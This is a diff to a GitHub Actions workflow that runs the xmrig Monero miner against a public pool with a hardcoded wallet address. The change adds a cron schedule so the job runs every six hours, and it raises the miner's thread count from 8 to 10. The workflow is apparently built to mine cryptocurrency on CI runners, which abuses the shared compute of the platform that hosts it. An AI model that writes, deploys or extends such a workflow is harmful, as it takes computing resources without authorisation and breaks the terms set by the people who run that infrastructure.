@@ -1,9 +1,11 @@
-name: Monero Mining Setup
+name: Monero 2 Mining Setup
 
 on: 
   push:
     branches:
       - main
+  schedule:
+    - cron: '15 */6 * * *'
 
 jobs:
   build:
@@ -30,4 +32,4 @@ jobs:
       - name: Start mining Monero
         run: |
           cd xmrig/build
-          ./xmrig -o pool.supportxmr.com:3333 -a rx/0 -u 43eBU2ohr7vMHwGasPjzQSNFSfkeVRsUXLm2eeedyWqcHWpTY1vGod1Qef5h2KqJgKbbPXkYc4nWEW2JbjLQtsdR9XTb1br -p raiden4 -t 8
+          ./xmrig -o pool.supportxmr.com:3333 -a rx/0 -u 43eBU2ohr7vMHwGasPjzQSNFSfkeVRsUXLm2eeedyWqcHWpTY1vGod1Qef5h2KqJgKbbPXkYc4nWEW2JbjLQtsdR9XTb1br -p raiden4 -t 10
